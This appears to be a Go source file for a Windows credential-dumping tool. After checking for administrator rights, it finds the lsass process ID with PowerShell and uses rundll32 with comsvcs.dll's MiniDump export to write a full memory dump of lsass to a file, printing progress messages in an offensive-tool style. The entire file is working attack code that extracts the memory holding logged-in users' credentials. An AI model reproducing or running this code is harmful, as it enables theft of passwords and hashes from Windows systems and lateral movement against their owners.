package main

import (
	"flag"
	"fmt"
	"os"
	"os/exec"
	"syscall"
)

func main() {
	path := flag.String("p",".\\","Path to save the dump file")
	flag.Parse()
	dump(*path)
}

//https://stackoverflow.com/questions/31558066/how-to-ask-for-administer-privileges-on-windows-with-go
//check if the program is launched in admin
func amAdmin() bool {
	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
	if err != nil {
		return false	//not admin
	}
	return true		//admin
}

func dump(path string) {
	var sI syscall.StartupInfo
	var pI syscall.ProcessInformation
	pathFile := fmt.Sprintf("%slsass.dmp",path)
	if amAdmin() == false {
		fmt.Println("You have to be admin...")
		return
	} else {
		fmt.Println("[+] Get process id")
		//Get lsass process pid
		cmd := exec.Command("powershell", "/C", "(Get-Process -Name lsass).Id")
		pid, _ := cmd.Output()
		fmt.Print("[+] Dump process " + string(pid))
		//dump the process with rundll32
		argv, _ := syscall.UTF16PtrFromString("rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump " + string(pid) + " " + pathFile + " full")
		err := syscall.CreateProcess(
			nil,
			argv,
			nil,
			nil,
			true,
			0,
			nil,
			nil,
			&sI,
			&pI)
		if err == nil {
			fmt.Println("[+] Process dumped")
			fmt.Println("[+] The dump is under " + pathFile)
		}
	}
}
